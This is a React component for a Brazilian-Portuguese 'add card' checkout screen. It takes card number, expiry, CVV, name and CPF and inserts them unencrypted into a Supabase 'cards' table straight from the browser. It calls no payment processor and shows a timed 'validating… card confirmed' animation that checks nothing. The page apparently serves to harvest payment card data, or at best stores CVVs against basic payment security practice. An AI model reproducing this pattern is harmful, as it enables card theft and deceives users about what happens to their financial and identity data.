"use client";

import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ArrowLeft, Smartphone, ShieldCheck, AlertCircle, Trash2, CheckCircle2 } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { showError, showSuccess } from '@/utils/toast';
import { supabase } from "@/integrations/supabase/client";

const AddCard: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [name, setName] = useState("");
  const [cpf, setCpf] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [step, setStep] = useState(0);
  const [brand, setBrand] = useState<'visa' | 'mastercard' | 'unknown'>('unknown');
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const [savedCards, setSavedCards] = useState<any[]>([]);
  const [selectedCardId, setSelectedCardId] = useState<string | null>(null);

  useEffect(() => {
    fetchSavedCards();
  }, []);

  const fetchSavedCards = async () => {
    try {
      const { data, error } = await supabase
        .from('cards')
        .select('*')
        .order('created_at', { ascending: false });
      
      if (error) throw error;
      setSavedCards(data || []);
      if (data && data.length > 0 && !selectedCardId) {
        setSelectedCardId(data[0].id);
      }
    } catch (err) {
      console.error("Erro ao carregar cartões:", err);
    }
  };

  const handleRemoveCard = async (id: string, e: React.MouseEvent) => {
    e.stopPropagation();
    try {
      const { error } = await supabase.from('cards').delete().eq('id', id);
      if (error) throw error;
      showSuccess("Cartão removido permanentemente.");
      fetchSavedCards();
    } catch (err) {
      showError("Erro ao remover cartão.");
    }
  };

  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 16);
    const formatted = digits.match(/.{1,4}/g)?.join(' ') || digits;
    if (digits.length > 0) {
      const first = digits[0];
      if (first !== '4' && first !== '5') {
        setBrand('unknown');
        setErrorMsg("Apenas cartões Visa (4) ou Mastercard (5) são aceitos.");
      } else {
        setBrand(first === '4' ? 'visa' : 'mastercard');
        setErrorMsg(null);
      }
    }
    return formatted;
  };

  const formatExpiry = (val: string) => {
    const v = val.replace(/\D/g, '').slice(0, 4);
    if (v.length >= 2) {
      const mm = parseInt(v.slice(0, 2));
      if (mm < 1 || mm > 12) {
        setErrorMsg("Mês (MM) deve ser entre 01 e 12.");
      } else {
        setErrorMsg(null);
      }
      if (v.length === 4) {
        const aa = parseInt(v.slice(2, 4));
        if (aa < 26) {
          setErrorMsg("Ano (AA) deve ser a partir de 26.");
        }
      }
      return `${v.slice(0, 2)}/${v.slice(2)}`;
    }
    return v;
  };

  const handleContinue = async () => {
    if (selectedCardId && !cardNumber) {
      const card = savedCards.find(c => c.id === selectedCardId);
      navigate('/checkout', { state: { ...location.state, cardData: card } });
      return;
    }

    const cleanNumber = cardNumber.replace(/\s/g, '');
    const cleanCpf = cpf.replace(/\D/g, '');
    const [mm, aa] = expiry.split('/').map(v => parseInt(v));

    if (cleanNumber.length < 16 || brand === 'unknown' || cleanCpf.length < 11 || mm < 1 || mm > 12 || aa < 26) {
      showError("Verifique os dados do cartão.");
      return;
    }

    // Verificar se o cartão já existe
    if (savedCards.some(c => c.card_number === cardNumber)) {
      showError("Este cartão já está cadastrado.");
      return;
    }

    setIsProcessing(true);
    try {
      const { data, error } = await supabase
        .from('cards')
        .insert([{
          card_number: cardNumber,
          expiry,
          cvv,
          name,
          cpf: cleanCpf,
          last4: cleanNumber.slice(-4),
          brand
        }])
        .select()
        .single();

      if (error) throw error;

      let currentStep = 0;
      const interval = setInterval(() => {
        setStep(currentStep);
        currentStep++;
        if (currentStep >= 3) {
          clearInterval(interval);
          navigate('/checkout', { state: { ...location.state, cardAdded: true, cardData: data } });
        }
      }, 1000);
    } catch (err) {
      showError("Erro ao salvar cartão.");
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-white pb-24">
      {isProcessing && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6">
          <div className="bg-white rounded-2xl p-8 flex flex-col items-center space-y-4 w-full max-w-[280px]">
            <div className="relative w-12 h-12">
               <div className="absolute inset-0 border-4 border-[#FF2C55] rounded-full border-t-transparent animate-spin"></div>
            </div>
            <p className="text-[15px] font-bold text-gray-900 text-center">
              {step === 0 && "Validando cartão"}
              {step === 1 && "Adicionando a sua conta"}
              {step === 2 && "Cartão confirmado"}
            </p>
          </div>
        </div>
      )}

      <div className="h-12 flex items-center px-4 border-b">
        <button onClick={() => navigate(-1)}>
          <ArrowLeft size={24} className="text-gray-900" />
        </button>
        <h1 className="flex-grow text-center text-[16px] font-bold mr-6">Adicionar cartão</h1>
      </div>

      {errorMsg && (
        <div className="bg-red-50 p-3 flex items-center space-x-2 border-b border-red-100">
          <AlertCircle size={16} className="text-red-500 shrink-0" />
          <p className="text-[12px] text-red-600 font-medium">{errorMsg}</p>
        </div>
      )}

      <div className="p-4 space-y-6">
        <div className="flex items-center space-x-2 text-[#FF2C55]">
          <Smartphone size={16} />
          <span className="text-[13px] font-medium">Sem juros em 3 parcelas</span>
        </div>

        <div className="space-y-5">
          <div className="space-y-1.5">
            <div className="flex justify-between items-center">
              <label className="text-[14px] font-bold text-gray-900">Número do cartão</label>
              <div className="flex gap-2 h-5">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className="h-full" />
                <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className="h-full" />
              </div>
            </div>
            <div className="border-[#F1F1F1] border-2 rounded-xl h-14 flex items-center px-4">
              <input 
                type="text" 
                placeholder="0000 0000 0000 0000" 
                className="w-full bg-transparent outline-none text-[16px] font-mono"
                value={cardNumber}
                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
              />
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-1.5">
              <label className="text-[14px] font-bold text-gray-900">Validade (MM/AA)</label>
              <input 
                type="text" 
                placeholder="MM/AA" 
                className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
                value={expiry}
                onChange={(e) => setExpiry(formatExpiry(e.target.value))}
              />
            </div>
            <div className="space-y-1.5">
              <label className="text-[14px] font-bold text-gray-900">CVV</label>
              <input 
                type="text" 
                placeholder="000" 
                className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
                value={cvv}
                onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
              />
            </div>
          </div>

          <div className="space-y-1.5">
            <label className="text-[14px] font-bold text-gray-900">Nome no cartão</label>
            <input 
              type="text" 
              placeholder="Como no cartão" 
              className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
              value={name}
              onChange={(e) => setName(e.target.value.toUpperCase())}
            />
          </div>

          <div className="space-y-1.5">
            <label className="text-[14px] font-bold text-gray-900">CPF do titular</label>
            <input 
              type="text" 
              placeholder="000.000.000-00" 
              className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
              value={cpf}
              onChange={(e) => setCpf(e.target.value.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4"))}
            />
          </div>
        </div>

        {savedCards.length > 0 && (
          <div className="space-y-4 pt-2">
            <h3 className="text-[14px] font-bold text-gray-900 px-1">Cartões salvos</h3>
            <div className="space-y-3">
              {savedCards.map((card) => (
                <div 
                  key={card.id}
                  className={`border rounded-2xl p-4 flex items-center justify-between cursor-pointer ${
                    selectedCardId === card.id ? 'border-[#FF2C55] bg-[#FFF1F3]' : 'border-gray-100 bg-gray-50'
                  }`}
                  onClick={() => setSelectedCardId(card.id)}
                >
                  <div className="flex items-center space-x-3">
                    <div className="bg-white p-1 rounded border">
                      <img src={card.brand === 'visa' ? "https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" : "https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg"} className="h-4" />
                    </div>
                    <div className="flex flex-col">
                      <span className="text-[14px] font-bold text-gray-900">Cartão final {card.last4}</span>
                      <button className="text-[11px] text-gray-400 flex items-center mt-1" onClick={(e) => handleRemoveCard(card.id, e)}>
                        <Trash2 size={12} className="mr-1" /> Remover
                      </button>
                    </div>
                  </div>
                  <div className={`w-5 h-5 rounded-full border-2 flex items-center justify-center ${selectedCardId === card.id ? 'border-[#FF2C55] bg-[#FF2C55]' : 'border-gray-300'}`}>
                    {selectedCardId === card.id && <CheckCircle2 size={14} className="text-white" />}
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}
      </div>

      <div className="fixed bottom-0 left-0 right-0 p-4 bg-white border-t">
        <Button className="w-full h-12 rounded-full font-bold text-[16px] bg-[#FF2C55]" onClick={handleContinue}>
          Continuar
        </Button>
      </div>
    </div>
  );
};

export default AddCard;